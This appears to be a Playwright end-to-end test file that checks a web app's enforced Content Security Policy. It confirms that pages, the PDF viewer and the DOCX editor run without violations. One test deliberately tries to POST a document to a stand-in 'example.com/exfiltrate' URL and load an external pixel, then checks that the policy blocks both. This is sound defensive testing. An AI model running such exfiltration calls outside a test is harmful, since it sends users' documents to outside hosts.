/**
 * The NativeCluster app's pages under their enforced Content Security
 * Policy (frontend/src/app/lib/securityHeaders.ts ncAppCsp; the 2026-11-24
 * security review, L6): nothing a page sends leaves the app's origin, and
 * every page still works, Next's inline runtime, the PDF viewer and the
 * DOCX editor included, with no violation reported. Run it in Chromium and
 * in WebKit (HARNESS_BROWSER=webkit).
 */
import path from "node:path";
import { test, expect, type Page } from "../shim/fixtures";
import { PDF_FIXTURE } from "../../../../e2e/helpers";
import { createProject } from "../lib/projects";

const DOCX_FIXTURE = path.resolve(__dirname, "../../../../frontend/public/preset-templates/Common Paper/One-Way NDA.docx");

/** Every violation the pages report, across navigations, workers' console included. */
async function watchViolations(page: Page): Promise<() => string[]> {
    const seen: string[] = [];
    await page.exposeFunction("__harnessCspViolation", (line: string) => void seen.push(line));
    await page.addInitScript(() => {
        document.addEventListener("securitypolicyviolation", (e) => {
            const report = (window as unknown as { __harnessCspViolation?: (l: string) => void }).__harnessCspViolation;
            report?.(`${e.disposition} ${e.effectiveDirective} blocked ${e.blockedURI || "(inline)"} at ${e.sourceFile || location.pathname}:${e.lineNumber}`);
        });
    });
    page.on("console", (message) => {
        const text = message.text();
        if (/content security policy|refused to (load|connect|execute|apply|frame|create)/i.test(text)) seen.push(`console: ${text}`);
    });
    return () => [...seen];
}

async function openDocument(page: Page, filename: string) {
    await page.getByText(filename, { exact: true }).first().click();
}

test("the policy is enforced, and only the app's own origin is reached", async ({ page }) => {
    test.setTimeout(60_000);
    const violations = await watchViolations(page);
    const response = await page.goto("/assistant");
    const headers = response!.headers();
    expect(headers["content-security-policy"]).toContain("connect-src 'self'");
    expect(headers["content-security-policy"]).toContain("default-src 'self'");
    expect(headers["content-security-policy-report-only"]).toBeUndefined();
    await expect(page.getByPlaceholder("How can I help?")).toBeVisible({ timeout: 30_000 });

    // A page that tried to send something elsewhere is stopped, and says so.
    const sent = await page.evaluate(async () => {
        try {
            await fetch("https://example.com/exfiltrate", { method: "POST", body: "a document", mode: "no-cors" });
            return "sent";
        } catch {
            return "blocked";
        }
    });
    expect(sent).toBe("blocked");
    await expect.poll(() => violations().some((v) => v.includes("connect-src") && v.includes("example.com"))).toBe(true);
    await page.evaluate(() => new Promise<void>((resolve) => {
        const img = new Image();
        img.onerror = img.onload = () => resolve();
        img.src = "https://example.com/pixel.png";
    }));
    await expect.poll(() => violations().some((v) => v.includes("img-src") && v.includes("example.com"))).toBe(true);
});

test("every page works under the policy, the PDF viewer and the DOCX editor too", async ({ page }) => {
    test.setTimeout(240_000);
    const violations = await watchViolations(page);

    for (const p of ["/assistant", "/projects", "/tabular-reviews", "/workflows", "/playbooks", "/library", "/settings", "/settings/connectors"]) {
        const r = await page.goto(p);
        expect(r?.status(), p).toBeLessThan(400);
        // Next's inline runtime ran: the page hydrated and is interactive.
        await expect(page.locator("main, [role=main], body").first()).toBeVisible();
        await page.waitForLoadState("networkidle");
    }

    await createProject(page, `CSP ${Date.now()}`, PDF_FIXTURE);
    await page.waitForLoadState("networkidle");
    await openDocument(page, "test.pdf");
    await expect(page.locator("canvas, .textLayer, [data-page-number]").first()).toBeVisible({ timeout: 60_000 });
    await page.waitForLoadState("networkidle");

    // A DOCX, in the DOCX editor (HarfBuzz WebAssembly, packaged fonts).
    await createProject(page, `CSP DOCX ${Date.now()}`, DOCX_FIXTURE);
    await page.waitForLoadState("networkidle");
    await openDocument(page, "One-Way NDA.docx");
    await expect(page.getByText(/non-?disclosure|confidential/i).first()).toBeVisible({ timeout: 60_000 });
    await page.waitForLoadState("networkidle");
    await test.info().attach("the DOCX view", { body: await page.screenshot(), contentType: "image/png" });

    expect(violations()).toEqual([]);
});
